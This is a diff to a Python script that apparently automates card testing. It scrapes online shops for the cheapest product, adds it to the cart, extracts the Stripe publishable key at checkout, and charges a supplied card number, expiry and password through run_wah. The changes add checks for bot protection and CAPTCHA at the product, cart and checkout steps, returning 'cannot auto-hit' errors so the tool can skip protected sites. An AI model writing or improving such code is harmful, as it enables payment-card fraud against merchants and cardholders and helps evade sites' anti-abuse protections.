@@ -322,11 +322,23 @@ def find_cheapest_product(session: requests.Session, site_url: str) -> dict | No
     Scrape the site for products and return info about the cheapest available one.
     Returns dict with keys: title, price, product_url, variant_id (if any)
     or None if nothing found.
+    When bot-protection is detected, returns {"error": "<message>"} instead.
     """
+    last_protection_error: str | None = None
+
     # 1. Try Shopify /products.json endpoint first
     for path in ["/products.json", "/collections/all/products.json"]:
         try:
             r = session.get(site_url + path, timeout=15)
+
+            protection_error = _detect_bot_protection(r)
+            if protection_error:
+                last_protection_error = protection_error
+                continue
+
+            if _detect_captcha(r.text):
+                return {"error": "Site requires CAPTCHA on product pages — cannot auto-hit"}
+
             if r.status_code == 200:
                 data = r.json()
                 products = data.get("products", [])
@@ -359,6 +371,15 @@ def find_cheapest_product(session: requests.Session, site_url: str) -> dict | No
     for path in ["/shop", "/products", "/store", "/collections/all", "/"]:
         try:
             r = session.get(site_url + path, timeout=15)
+
+            protection_error = _detect_bot_protection(r)
+            if protection_error:
+                last_protection_error = protection_error
+                continue
+
+            if _detect_captcha(r.text):
+                return {"error": "Site requires CAPTCHA on product pages — cannot auto-hit"}
+
             if r.status_code != 200:
                 continue
             html = r.text
@@ -389,6 +410,9 @@ def find_cheapest_product(session: requests.Session, site_url: str) -> dict | No
                 return cheapest
         except Exception:
             continue
+
+    if last_protection_error:
+        return {"error": last_protection_error}
 
     return None
 
@@ -424,6 +448,11 @@ def checkout_and_charge(
                          "Referer": site_url},
                 timeout=15,
             )
+            protection_error = _detect_bot_protection(r)
+            if protection_error:
+                return {"status": "error", "message": f"Bot protection at cart step: {protection_error}", "stripe_pk": None}
+            if _detect_captcha(r.text):
+                return {"status": "error", "message": "Site requires CAPTCHA at cart step — cannot auto-hit", "stripe_pk": None}
             if r.status_code == 200:
                 cart_added = True
         except Exception:
@@ -432,6 +461,11 @@ def checkout_and_charge(
     if not cart_added and product_url:
         try:
             r_prod = session.get(product_url, timeout=15)
+            protection_error = _detect_bot_protection(r_prod)
+            if protection_error:
+                return {"status": "error", "message": f"Bot protection at product page: {protection_error}", "stripe_pk": None}
+            if _detect_captcha(r_prod.text):
+                return {"status": "error", "message": "Site requires CAPTCHA at product page — cannot auto-hit", "stripe_pk": None}
             if r_prod.status_code == 200:
                 hidden = _extract_form_fields(r_prod.text)
                 add_url_m = re.search(
@@ -445,7 +479,12 @@ def checkout_and_charge(
                     r_prod.text, re.IGNORECASE
                 ):
                     payload.setdefault("id", m.group(1))
-                session.post(add_url, data=payload, timeout=15, allow_redirects=True)
+                r_add = session.post(add_url, data=payload, timeout=15, allow_redirects=True)
+                protection_error = _detect_bot_protection(r_add)
+                if protection_error:
+                    return {"status": "error", "message": f"Bot protection at cart step: {protection_error}", "stripe_pk": None}
+                if _detect_captcha(r_add.text):
+                    return {"status": "error", "message": "Site requires CAPTCHA at cart step — cannot auto-hit", "stripe_pk": None}
                 cart_added = True
         except Exception:
             pass
@@ -453,9 +492,19 @@ def checkout_and_charge(
     # ── Step 2: Go to checkout and find Stripe PK ────────────────────────────
     stripe_pk = None
     checkout_html = ""
+    last_checkout_protection_error: str | None = None
     for checkout_path in ["/checkout", "/cart", "/shop/checkout", "/order"]:
         try:
             r_co = session.get(site_url + checkout_path, timeout=20, allow_redirects=True)
+
+            protection_error = _detect_bot_protection(r_co)
+            if protection_error:
+                last_checkout_protection_error = protection_error
+                continue
+
+            if _detect_captcha(r_co.text):
+                return {"status": "error", "message": "Site requires CAPTCHA at checkout — cannot auto-hit", "stripe_pk": None}
+
             if r_co.status_code == 200:
                 checkout_html = r_co.text
                 stripe_pk = _extract_stripe_pk(checkout_html)
@@ -478,6 +527,12 @@ def checkout_and_charge(
                     continue
 
     if not stripe_pk:
+        if last_checkout_protection_error:
+            return {
+                "status": "error",
+                "message": f"Bot protection at checkout: {last_checkout_protection_error}",
+                "stripe_pk": None,
+            }
         return {
             "status": "error",
             "message": "Stripe PK not found on checkout page",
@@ -726,6 +781,15 @@ def run_wah(site_url: str, email: str, password: str, cc: str, mm: str, yy: str,
         return {
             "status": "error",
             "message": "No products found on site",
+            "product_title": None,
+            "product_price": None,
+            "stripe_pk": None,
+            "elapsed": round(time.time() - start, 2),
+        }
+    if "error" in product:
+        return {
+            "status": "error",
+            "message": product["error"],
             "product_title": None,
             "product_price": None,
             "stripe_pk": None,
